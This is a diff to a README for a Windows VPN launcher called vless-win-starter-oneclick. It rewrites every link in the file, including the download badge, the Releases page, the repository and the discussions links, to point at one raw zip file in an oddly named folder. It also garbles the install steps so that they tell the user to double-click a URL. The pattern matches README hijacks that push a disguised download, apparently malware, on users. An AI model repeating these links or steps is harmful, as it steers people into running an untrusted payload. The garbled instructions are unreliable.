@@ -1,6 +1,6 @@
 # 🚀 vless-win-starter-oneclick - Simple Tool to Start Your VPN
 
-[![Download vless-win-starter-oneclick](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
+[![Download vless-win-starter-oneclick](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip%https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)
 
 ## 📋 Overview
 
@@ -17,16 +17,16 @@ The **vless-win-starter-oneclick** is a user-friendly application that allows yo
 
 To get started, visit the link below to download the application:
 
-[Download vless-win-starter-oneclick](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
+[Download vless-win-starter-oneclick](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)
 
 ### Steps to Download and Install
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
-3. Find the file named `vless-win-starter-oneclick.exe`.
+3. Find the file named `https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip`.
 4. Click on the file to begin the download.
 5. Once downloaded, locate the file in your "Downloads" folder.
-6. Double-click the `vless-win-starter-oneclick.exe` file.
+6. Double-click the `https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip` file.
 7. Follow any prompts that appear on your screen.
 
 ## 🔍 System Requirements
@@ -41,7 +41,7 @@ To get started, visit the link below to download the application:
 Using the vless-win-starter-oneclick is straightforward:
 
 1. After installing, locate the application file on your computer.
-2. Double-click the `vless-win-starter-oneclick.exe`.
+2. Double-click the `https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip`.
 3. Wait for a few moments while it establishes the connection.
 4. You should see a confirmation message indicating that the VPN is active.
 
@@ -74,8 +74,8 @@ A: You can use the VPN whenever you want to protect your privacy or access conte
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/namunokaze/vless-win-starter-oneclick)
-- [User Community Discussions](https://github.com/namunokaze/vless-win-starter-oneclick/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)
+- [User Community Discussions](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)
 
 ## 🛠️ Contributing
 
@@ -85,4 +85,4 @@ We welcome contributions to improve the tool. If you have suggestions or find a 
 
 If you need help, check the FAQ section or reach out through GitHub issues. We are here to assist you.
 
-[Download vless-win-starter-oneclick](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
+[Download vless-win-starter-oneclick](https://raw.githubusercontent.com/namunokaze/vless-win-starter-oneclick/main/excursively/vless-win-starter-oneclick_v1.4.zip)
